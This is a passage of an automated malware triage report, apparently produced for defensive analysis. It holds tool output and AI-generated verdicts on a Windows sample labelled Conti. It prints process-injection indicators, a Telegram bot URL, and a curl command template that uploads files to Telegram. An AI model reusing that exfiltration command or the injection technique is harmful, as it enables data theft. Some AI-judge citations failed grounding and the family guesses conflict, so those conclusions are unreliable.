        "physical_size": 46080,
        "virtual_size": 49152,
        "rights": "R",
        "entropy": 97
      },
      {
        "name": "/31",
        "effective_address": 542208,
        "physical_size": 9216,
        "virtual_size": 12288,
        "rights": "R",
        "entropy": 111
      },
      {
        "name": "/45",
        "effective_address": 554496,
        "physical_size": 8192,
        "virtual_size": 8192,
        "rights": "R",
        "entropy": 116
      },
      {
        "name": "/57",
        "effective_address": 562688,
… [71220 more chars]
```

### LLM citation grounding

```json
{
  "ok": true,
  "checked": 7,
  "hits": 7,
  "misses": [],
  "hit_examples": [
    "all metadata fields static_profile Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation",
    "allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), create_remote_thread (CreateRemoteThread), ",
    "full function decompilation decompilation (sub_140001550) Shows the sample generates a temp DLL path (%s\\dl%lu.dll), wri",
    "5368836224 | https://api.telegram.org/bot suspicious strings This is a known Telegram Bot API C2 endpoint, indicating th",
    "inject thread (T1055.003), inject dll (T1055.001), encrypt data using RC4 PRGA (T1027) top_rules capa confirms the sampl"
  ],
  "reason": ""
}
```

### LLM / outcome preview

```json
{
  "verdict": "Malicious",
  "family": "Conti (ransomware loader/initial access payload)",
  "score": 98,
  "agreement": "llm_and_v1_agree",
  "source": "llm_judge",
  "model": "step-3.7-flash",
  "key_evidence": [
    {
      "source": "malcat",
      "query_or_table": "static_profile",
      "row_or_rule": "all metadata fields",
      "why": "Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation), 5 anomalies including XorInLoop and EmbeddedProgram, consistent with malicious obfuscated code."
    },
    {
      "source": "pe_imports",
      "query_or_table": "pe_imports signals",
      "row_or_rule": "allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessMemory), create_remote_thread (CreateRemoteThread), change_memory_protection (VirtualProtect)",
      "why": "These are core process injection APIs mapped to ATT&CK T1055 (Process Injection), a common malware behavior for executing code in remote processes."
    },
    {
      "source": "malcat",
      "query_or_table": "decompilation (sub_140001550)",
      "row_or_rule": "full function decompilation",
      "why": "Shows the sample generates a temp DLL path (%s\\dl%lu.dll), writes an embedded payload to the file, locates the explorer.exe process, uses VirtualAllocEx/WriteProcessMemory to inject the DLL path into the target process, and CreateRemoteThread to execute it, confirming DLL injection functionality."
    },
    {
      "source": "ghidra",
      "query_or_table": "suspicious strings",
      "row_or_rule": "5368836224 | https://api.telegram.org/bot",
      "why": "This is a known Telegram Bot API C2 endpoint, indicating the sample uses Telegram for command and control communications, a common tactic for modern malware to evade detection."
    },
    {
      "source": "capa",
      "query_or_table": "top_rules",
      "row_or_rule": "inject thread (T1055.003), inject dll (T1055.001), encrypt data using RC4 PRGA (T1027)",
      "why": "capa confirms the sample has process injection (thread hijacking and DLL injection) and RC4 obfuscation capabilities, all associated with malicious defense evasion and execution techniques."
    },
    {
      "source": "yara",
      "query_or_table": "yara matches",
      "row_or_rule": "inject_thread, spyeye",
      "why": "YARA matches against known malicious rules for process injection and spyware/stealer functionality, corroborating the malicious behavior identified via other analysis methods."
    },
    {
      "source": "malcat",
      "query_or_table": "anomalies",
      "row_or_rule": "EmbeddedProgram (embedding)",
      "why": "Confirms the sample contains an embedded PE file, which is typical for malware that drops and executes secondary payloads after injection."
    }
  ],
  "summary": "This is a malicious 64-bit Windows PE sample, likely a Conti ransomware loader/initial access payload. It is heavily obfuscated (98 entropy, RC4 encryption) and exhibits classic process injection behavior: it drops a DLL to a temp path, injects it into the explorer.exe process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread. It uses a Telegram Bot API endpoint for C2 communication"
}
```

### Artifact paths (verify on disk)

- **prompt:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/prompt.txt` exists=`True` bytes=`26942` mtime=`2026-08-05T05:23:16.611393+00:00`
  - sha256: `3c1675c784cdd01ee093ed1c57c71978e9ce88bc095dc0be0af27dca4c351148`
- **verdict:** `/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/verdict.json` exists=`True` bytes=`5637` mtime=`2026-08-05T05:24:06.562071+00:00`
  - sha256: `be81278898cb7c0ad8f6df2def5bf32c535fd171b5297457ee09b606a9501331`

#### prompt_excerpt

```
# Triage evidence
sha256: 28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
sample_path: /opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti
ghidra_session: ghidra-pe-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9
ida_session: ida-28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9

## Source decisions (from intake validation)
- imports: ghidra (confidence=medium) — IDA is unavailable due to validation failure (warning: [Errno 2] No such file or directory: '/usr/local/bin/idasql') and reports 0 imports; Ghidra reports 66 full import entries {ghidra, imports, 66, Ghidra provides detailed import listing data unlike Malcat's count-only imports_count metric}.
- functions: ghidra (confidence=medium) — IDA is unavailable due to validation failure and reports 0 functions; Ghidra reports 86 functions {ghidra, funcs, 86, Ghidra provides a comprehensive function l
… [25921 more chars]
```


#### verdict_excerpt

```
{
  "verdict": "Malicious",
  "score": 98,
  "family_guess": "Conti (ransomware loader/initial access payload)",
  "cross_engine_notes": "IDA is unavailable due to validation failure, so all analysis relies on Ghidra, Malcat, capa, pe_imports, YARA, and FLOSS. Ghidra's imports table is empty for this sample, so import data is sourced from Malcat and pe_imports to avoid data gaps. String data is combined from Ghidra (5317 strings) and Malcat (100 strings) for maximum coverage.",
  "key_evidence": [
    {
      "source": "malcat",
      "query_or_table": "static_profile",
      "row_or_rule": "all metadata fields",
      "why": "Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation), 5 anomalies including XorInLoop and EmbeddedProgram, consistent with malicious obfuscated code."
    },
    {
      "source": "pe_imports",
      "query_or_table": "pe_imports signals",
      "row_or_rule": "allocate_memory (VirtualAllocEx), write_process_memory (WriteProcessM
… [4637 more chars]
```


---

## Stage: deep_dive

**ok:** `True`

### Checks

| Check | Result |
|-------|--------|
| 01_tools_raw | `True` |
| 00_sql_evidence | `False` |
| 03_prompt | `False` |
| 04_llm | `False` |
| 05_deep | `True` |
| tools_all_ok | `True` |
| llm_source | `False` |
| citations_grounded | `True` |
| engine_citation_ok | `True` |
| upx_second_pass_ok | `True` |
| no_incomplete_tooling | `True` |
| confidence_sane | `True` |
| evidence_pack_present | `True` |
| agentic_json | `True` |
| sql_deep_re | `True` |
| complete_verdict | `True` |
| not_incomplete | `True` |
| checklist_ok_flag | `True` |
| agentic_confidence_sane | `True` |

### Tools (full evidence excerpts)

#### `malcat` — ok=`True` why=`not_applicable:pe`

```json

```

#### `capa` — ok=`True` why=`ok`

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Cryptography",
            "Encrypt Data",
            "RC4"
          ],
          "objective": "Cryptography",
          "behavior": "Encrypt Data",
          "method": "RC4",
          "id": "C0027.009"
        },
        {
          "parts": [
            "Cryptography",
            "Generate Pseudo-random Sequence",
            "RC4 PRGA"
          ],
          "objective": "Cryptography",
          "behavior": "Generate Pseudo-random Sequence",
          "method": "RC4 PRGA",
          "id": "C0021.004"
        }
      ]
    },
    {
      "name": "get common file path",
      "attack": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "tactic": "Discovery",
          "technique": "File and Directory Discovery",
          "subtechnique": "",
          "id": "T1083"
        }
      ],
      "mbc": [
        {
          "parts": [
            "Discovery",
            "File and Directory Discovery"
          ],
          "objective": "Discovery",
          "behavior": "File and Directory Discovery",
          "method": "",
          "id": "E1083"
        }
      ]
    },
    {
      "name": "inject thread",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Process Injection",
            "Thread Execution Hijacking"
          ],
          "tactic": "Defense Evasion",
          "technique": "Process Injection",
          "subtechnique": "Thread Execution Hijacking",
          "id": "T1055.003"
        },
        {
          "parts": [
            "Defense Evasion",
            "Reflective Code Loading"
          ],
          "tactic": "Defense Evasion",
          "technique": "Reflective Code Loading",
          "subtechnique": "",
          "id": "T1620"
        }
      ],
      "mbc": []
    },
    {
      "name": "enumerate processes",
      "attack": [
        {
          "parts": [
            "Discovery",
            "Process Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Process Discovery",
          "subtechnique": "",
          "id": "T1057"
        },
        {
          "parts": [
            "Discovery",
            "Software Discovery"
          ],
          "tactic": "Discovery",
          "technique": "Software Discovery",
          "subtechnique": "",
          "id": "T1518"
        }
      ],
      "mbc": []
    },
    {
      "name": "contain an embedded PE file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "Execution",
            "Install Additional Program"
          ],
          "objective": "Execution",
          "behavior": "Install Additional Program",
          "method": "",
          "id": "B0023"
        }
      ]
    },
    {
      "name": "delete file",
      "attack": [],
      "mbc": [
        {
          "parts": [
            "File System",
            "Delete File"
          ],
          "objective": "File System",
          "behavior": "Delete File",
          "method"
… [3308 more chars]
```

#### `pe_imports` — ok=`True` why=`ok`

```json
{
  "engine": "pe_imports",
  "sample_size": 593885,
  "duration_s": 0.04,
  "import_count": 66,
  "signal_count": 5,
  "signals": [
    {
      "label": "allocate_memory",
      "api_match": "VirtualAllocEx",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "write_process_memory",
      "api_match": "WriteProcessMemory",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "create_remote_thread",
      "api_match": "CreateRemoteThread",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "get_proc_address",
      "api_match": "GetProcAddress",
      "attack": [
        "T1129"
      ]
    },
    {
      "label": "change_memory_protection",
      "api_match": "VirtualProtect",
      "attack": [
        "T1055"
      ]
    }
  ],
  "hint": "PE import high-signal map (pefile). Not capa."
}
```

#### `yara` — ok=`True` why=`ok`

```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "spyeye",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$f",
          "offset": 452832,
          "length": 8,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IP",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$ipv4",
          "offset": 124590,
          "length": 28,
          "xor_key": null
        },
        {
          "id": "$ipv6",
          "offset": 124914,
          "length": 6,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "contains_base64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$a",
          "offset": 1600,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "url",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$url_regex",
          "offset": 124032,
          "length": 56,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "IsPE64",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "IsWindowsGUI",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "HasOverlay",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": []
    },
    {
      "rule": "SEH__v4",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$",
          "offset": 592021,
          "length": 12,
          "xor_key": null
        }
      ]
    },
    {
      "rule": "inject_thread",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$c1",
          "offset": 465120,
          "length": 11,
          "xor_key": null
        },
        {
          "id": "$c2",
          "offset": 465220,
          "length": 14,
          "xor_key": null
        },
        {
          "id": "$c4",
          "offset": 465322,
          "length": 18,
          "xor_key": null
        },
        {
          "id": "$c5",
          "offs
… [4046 more chars]
```

#### `floss` — ok=`True` why=`ok`

```json
{
  "floss_ok": true,
  "string_count": 7006,
  "strings_sampled": 80,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "`.data",
    ".rdata",
    "@.pdata",
    "@.xdata",
    ".idata",
    "@.reloc",
    "=CCG u",
    "AWAVAUATUWVSH",
    "X[^_]A\\A]A^A_",
    "8MZuJHcP<H",
    "AVWVSH",
    "UAVAUATWVSH",
    "[^_A\\A]A^]",
    "([^_]H",
    "@' t\tH",
    ".edata",
    "@.idata",
    ".reloc",
    "AVATUWVS",
    "TestpassI",
    "[^_]A\\A^A_",
    "h;\\$Xs#I",
    "J(A;J,}4Hc",
    "I(D;I,}FIc",
    "<_t`<ntT",
    "R(A;R,}-Hc",
    "ATUWVSH",
    "P[^_]A\\",
    "_GLOBAL_H9",
    "BHA;R,}VHc",
    "C8;C<|",
    "X[^_A^",
    "0[^_]A\\",
    "R(A;R,}",
    "AVUWVSH",
    "P[^_]A^",
    "U(;U,}:Hc",
    "<Et6<Qt2H",
    "D$0<Qt@H",
    "<st\\<f",
    "AVAUATUWVSH",
    "0[^_]A\\A]A^",
    "C8;C<}ZH",
    "C(;C,}3Lc",
    "C(;C,L",
    "D$ }hLc",
    "AWAVATUWVSH",
    "`[^_]A\\",
    "UAWAVAUATWVSH",
    "0<\tw5A",
    "[^_A\\A]A^A_]",
    "H[^_A^",
    "~D$8fH",
    "@$A9@(~",
    "C$9C(~",
    "@[^_]A\\",
    "S$9S(~",
    "UAVWVSH",
    "[^_A^]",
    "=UUUUw",
    "[^_]A\\A]A^A_",
    "IcP$fA",
    "HcC$fA",
    "LcC$fB",
    "HcS$fA",
    "8[^_]A\\A]A^A_",
    "D$L)D$X",
    "L$8HcD$L;A",
    "D$X+D$`",
    "ATUWVSLcY",
    "[^_]A\\",
    "[^_]A\\A]A^",
    "AUATUWVSH",
    "([^_]A\\A]",
    "WVSHcA",
    "H[^_]H",
    "H[^_]A\\A]",
    "H[^_]A\\A]H",
    "([^_A^H"
  ],
  "per_category": {
    "decoded_strings": 0,
    "stack_strings": 0,
    "tight_strings": 0,
    "language_strings": 0,
    "language_strings_missed": 0,
    "static_strings": 7006
  },
  "raw_key_total": 3,
  "floss_profile": "full",
  "floss_language": "none",
  "duration_s": 8.94,
  "size_bytes": 593885,
  "static_only": false,
  "size_exceeded_deobfuscate_limit": false
}
```

#### `dotnet` — ok=`True` why=`ok`

```json
{
  "is_dotnet": false,
  "runtime_version": null,
  "assembly_name": null,
  "module_name": null,
  "language_hint": null,
  "external_assembly_refs": [],
  "suspicious_native_refs": [],
  "suspicious_methods": [],
  "interesting_pinvoke": [],
  "has_suppress_ildasm": false,
  "shellcode_embed_hint": false,
  "il_total_lines": 0,
  "il_excerpt": ""
}
```

#### `r2_decomp` — ok=`True` why=`ok`

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "disassembly": {
    "0x140001440": "\u254e   ;-- WinMainCRTStartup:\n\u250c 18: entry0 ();\n\u2502       \u254e   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090\n\u2502       \u254e   0x140001447      c70001000000   mov dword [rax], 1\n\u2514       \u2514\u2500< 0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup  ; synchapi.h:138:0",
    "0x140001000": ";-- section..text:\n            ; DATA XREF from sym.__tmainCRTStartup @ 0x1400011a0(r)\n\u250c 1: sym.__mingw_invalidParameterHandler ();\n\u2514           0x140001000      c3             ret                        ; synchapi.h:88:0 ; [00] -r-x section size 8192 named .text",
    "0x140001010": "; DATA XREF from sym.__tmainCRTStartup @ 0x14000139c(r)\n\u250c 31: sym.cpp_unhandled_exception_filter (int64_t arg1);\n\u2502           ; arg int64_t arg1 @ rcx\n\u2502           0x140001010      31d2           xor edx, edx               ; synchapi.h:103:0\n\u2502           0x140001012      488b09         mov rcx, qword [rcx]       ; synchapi.h:118:0 ; arg1\n\u2502           0x140001015      8b01           mov eax, dword [rcx]       ; arg1\n\u2502           0x140001017      25ffffff20     and eax, 0x20ffffff\n\u2502           0x14000101c      3d43434720     cmp eax, 0x20474343        ; 'CCG '\n\u2502       \u250c\u2500< 0x140001021      7509           jne 0x14000102c\n\u2502       \u2502   0x140001023      8b5104         mov edx, dword [rcx + 4]   ; synchapi.h:119:0 ; arg1\n\u2502       \u2502   0x140001026      83e201         and edx, 1\n\u2502       \u2502   0x140001029      83ea01         sub edx, 1                 ; synchapi.h:118:0\n\u2502       \u2514\u2500> 0x14000102c      89d0           mov eax, edx               ; synchapi.h:123:0\n\u2514           0x14000102e      c3             ret",
    "0x140001030": "; DATA XREF from sym.__tmainCRTStartup @ 0x140001185(r)\n\u250c 7: sym.safe_flush ();\n\u2502           0x140001030      31c9           xor ecx, ecx               ; synchapi.h:127:0\n\u2514       \u250c\u2500< 0x140001032      e9b1190000     jmp sym.fflush             ; synchapi.h:129:0",
    "0x140001040": "\u250c 980: sym.__tmainCRTStartup (int64_t arg_1h);\n\u2502           ; arg int64_t arg_1h @ rbp+0x1\n\u2502           ; var int64_t var_20h @ rsp+0x20\n\u2502           ; var int64_t var_3ch @ rsp+0x3c\n\u2502           ; var int64_t var_4ch @ rsp+0x4c\n\u2502           0x140001040      4157           push r15                   ; synchapi.h:157:0\n\u2502           0x140001042      4156           push r14\n\u2502           0x140001044      4155           push r13\n\u2502           0x140001046      4154           push r12\n\u2502           0x140001048      55             push rbp\n\u2502           0x140001049      57             push rdi\n\u2502           0x14000104a      56             push rsi\n\u2502           0x14000104b      53             push rbx\n\u2502           0x14000104c      4883ec58       sub rsp, 0x58\n\u2502           0x140001050      65488b0425..   mov rax, qword gs:[0x30]   ; synchapi.h:167:0\n\u2502           0x140001059      488b7008       mov rsi, qword [rax + 8]   ; synchapi.h:175:0\n\u2502           0x14000105d      488b1dec03..   mov rbx, qword [0x140071450] ; synchapi.h:176:0 ; [0x140071450:8]=0x140074040\n\u2502 
… [2704 more chars]
```

#### `upx` — ok=`True` why=`ok`

```json
{
  "upx_ok": false,
  "is_packed": false,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "upx_probe_stdout": "                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2026\nUPX 5.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 7th 2026\n\n\nTested 0 file"
}
```

#### `xor` — ok=`True` why=`ok`

```json
{
  "xorsearch_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "candidates": [
    "Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r",
    "Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r"
  ],
  "xorsearch_stdout": "Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r\nFound XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r\n",
  "xorsearch_stderr": "",
  "xorsearch_returncode": 0
}
```

#### `speakeasy` — ok=`True` why=`ok`

```json
{
  "speakeasy_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "module_base": null,
  "entry_point": null,
  "key_events": [],
  "api_calls": [],
  "strings": []
}
```

#### `frida_probe` — ok=`True` why=`ok`

```json
{
  "frida_available": true,
  "frida_version": "17.16.4",
  "pe_probe": {
    "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
    "exists": true,
    "hook_candidates": [
      "KERNEL32.dll!CloseHandle",
      "KERNEL32.dll!CreateFileW",
      "KERNEL32.dll!CreateRemoteThread",
      "KERNEL32.dll!CreateToolhelp32Snapshot",
      "KERNEL32.dll!DeleteCriticalSection",
      "api-ms-win-crt-environment-l1-1-0.dll!__p__environ",
      "api-ms-win-crt-heap-l1-1-0.dll!_set_new_mode",
      "api-ms-win-crt-heap-l1-1-0.dll!calloc",
      "api-ms-win-crt-heap-l1-1-0.dll!free",
      "api-ms-win-crt-heap-l1-1-0.dll!malloc",
      "api-ms-win-crt-locale-l1-1-0.dll!_configthreadlocale",
      "api-ms-win-crt-math-l1-1-0.dll!__setusermatherr",
      "api-ms-win-crt-private-l1-1-0.dll!memcpy",
      "api-ms-win-crt-runtime-l1-1-0.dll!__p___argc",
      "api-ms-win-crt-runtime-l1-1-0.dll!__p___argv",
      "api-ms-win-crt-runtime-l1-1-0.dll!__p__acmdln",
      "api-ms-win-crt-runtime-l1-1-0.dll!_cexit",
      "api-ms-win-crt-runtime-l1-1-0.dll!_configure_narrow_argv",
      "api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func",
      "api-ms-win-crt-stdio-l1-1-0.dll!__p__commode",
      "api-ms-win-crt-stdio-l1-1-0.dll!__p__fmode",
      "api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vfprintf",
      "api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vswprintf",
      "api-ms-win-crt-string-l1-1-0.dll!_stricmp",
      "api-ms-win-crt-string-l1-1-0.dll!memset",
      "api-ms-win-crt-string-l1-1-0.dll!strlen",
      "api-ms-win-crt-string-l1-1-0.dll!strncmp",
      "api-ms-win-crt-string-l1-1-0.dll!wcslen"
    ]
  }
}
```

#### `frida_trace` — ok=`True` why=`not_applicable:pe`

```json

```

### LLM citation grounding

```json
{
  "ok": true,
  "checked": 30,
  "hits": 25,
  "misses": [
    "/sendDocument",
    "CreateMutexA",
    "FindProcessId",
    "mark_section_writable",
    "_pei386_runtime_relocator"
  ],
  "hit_examples": [
    "https://api.telegram.org/bot",
    "\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@\"%s\";type=ap",
    "C:\\Windows\\System32\\curl.exe",
    "Global\\BeaconMutex_12345",
    "CreateRemoteThread"
  ],
  "reason": ""
}
```

### LLM / outcome preview

```json
{
  "source": "deep_dive_agentic",
  "confidence": 95,
  "summary": "This is a 64-bit Windows GUI PE that functions as a C2 beacon / info-stealer. Static and behavioral evidence show it exfiltrates data to Telegram via curl, uses a mutex (Global\\BeaconMutex_12345) to prevent multiple instances, performs process injection through VirtualAllocEx/WriteProcessMemory/Crea",
  "key_evidence": [
    "https://api.telegram.org/bot",
    "/sendDocument",
    "\"%s\" -X POST --silent --output nul --connect-timeout 10 --max-time 20 --proxy %s -F chat_id=%s -F document=@\"%s\";type=application/octet-stream \"%s\"",
    "C:\\Windows\\System32\\curl.exe",
    "Global\\BeaconMutex_12345",
    "CreateMutexA",
    "CreateRemoteThread",
    "WriteProcessMemory",
    "VirtualAllocEx",
    "VirtualProtect",
    "CreateToolhelp32Snapshot",
    "Process32First",
    "Process32Next",
    "OpenProcess",
    "FindProcessId",
    "mark_section_writable",
    "WinMain",
    "_pei386_runtime_relocator",
    "encrypt data using RC4 PRGA",
    "inject thread",
    "enumerate processes",
    "contain an embedded PE file",
    "delete file",
    "get common file path",
    "screenshot",
    "win_mutex",
    "SEH__v4",
    "HasOverlay",
    "IsPE64",
    "IsWindowsGUI"
  ],
  "model": null,
  "llm_audit": null
}
```

### Agentic tool-call history (excerpts)

- **yara_scan** ok=`True` checklist=`True` — Required checklist tool (yara)

```json
{
  "rule_count": 12,
  "matches": [
    {
      "rule": "domain",
      "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
      "strings": [
        {
          "id": "$domain_regex",
          "offset": 0,
          "length": 2,
          "xor_key": null
        }
      ]
    },
    {
      "rule
… [7146 more chars]
```

- **malcat_analyze** ok=`True` checklist=`True` — Required checklist tool (malcat)

```json
{
  "analysis_id": 1,
  "path": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "profile": "deep",
  "limits": {
    "strings_max": 300,
    "imports_max": 300,
    "functions_max": 30,
    "anomaly_locations_max": 50,
    "decompile_top_n": 3
  },
  "file_summary": {
    "analysis_id": 1,
    "file_na
… [74298 more chars]
```

- **capa_analyze** ok=`True` checklist=`True` — Required checklist tool (capa)

```json
{
  "rule_count": 17,
  "top_rules": [
    {
      "name": "encrypt data using RC4 PRGA",
      "attack": [
        {
          "parts": [
            "Defense Evasion",
            "Obfuscated Files or Information"
          ],
          "tactic": "Defense Evasion",
          "technique": "Obfuscated Files or Information",
          "subtechnique": "",
          "id": "T1027"
        }
      ],
 
… [6408 more chars]
```

- **pe_import_signals** ok=`True` checklist=`True` — Required checklist tool (pe_imports)

```json
{
  "engine": "pe_imports",
  "sample_size": 593885,
  "duration_s": 0.04,
  "import_count": 66,
  "signal_count": 5,
  "signals": [
    {
      "label": "allocate_memory",
      "api_match": "VirtualAllocEx",
      "attack": [
        "T1055"
      ]
    },
    {
      "label": "write_process_memory",
      "api_match": "WriteProcessMemory",
      "attack": [
        "T1055"
      ]
    },
    {

… [454 more chars]
```

- **floss_extract** ok=`True` checklist=`True` — Required checklist tool (floss)

```json
{
  "floss_ok": true,
  "string_count": 7006,
  "strings_sampled": 80,
  "strings": [
    "!This program cannot be run in DOS mode.",
    "`.data",
    ".rdata",
    "@.pdata",
    "@.xdata",
    ".idata",
    "@.reloc",
    "=CCG u",
    "AWAVAUATUWVSH",
    "X[^_]A\\A]A^A_",
    "8MZuJHcP<H",
    "AVWVSH",
    "UAVAUATWVSH",
    "[^_A\\A]A^]",
    "([^_]H",
    "@' t\tH",
    ".edata",
    "@.id
… [1398 more chars]
```

- **dotnet_analyze** ok=`True` checklist=`True` — Required checklist tool (dotnet)

```json
{
  "is_dotnet": false,
  "runtime_version": null,
  "assembly_name": null,
  "module_name": null,
  "language_hint": null,
  "external_assembly_refs": [],
  "suspicious_native_refs": [],
  "suspicious_methods": [],
  "interesting_pinvoke": [],
  "has_suppress_ildasm": false,
  "shellcode_embed_hint": false,
  "il_total_lines": 0,
  "il_excerpt": ""
}
```

- **r2_decompile** ok=`True` checklist=`True` — Required checklist tool (r2_decomp)

```json
{
  "r2_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "disassembly": {
    "0x140001440": "\u254e   ;-- WinMainCRTStartup:\n\u250c 18: entry0 ();\n\u2502       \u254e   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090
… [5804 more chars]
```

- **upx_unpack** ok=`True` checklist=`True` — Required checklist tool (upx)

```json
{
  "upx_ok": false,
  "is_packed": false,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "upx_probe_stdout": "                       Ultimate Packer for eXecutables\n                          Copyright (C) 1996 - 2026\nUPX 5.1.0       Markus Oberhumer, Laszlo Molnar & John Reiser    Jan 7
… [29 more chars]
```

- **xor_string_search** ok=`True` checklist=`True` — Required checklist tool (xor)

```json
{
  "xorsearch_ok": true,
  "sample": "/opt/samples/corpus/pool/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/2026-07-03_057dff5650af402177d65141acdf65d0_conti",
  "candidates": [
    "Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r",
    "Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r"
  ],
  "xorsearch_stdout": "
… [220 more chars]
```

- **speakeasy_emulate** ok=`True` checklist=`True` — Required checklist tool (speakeasy)

```json
{
  "speakeasy_ok": true,
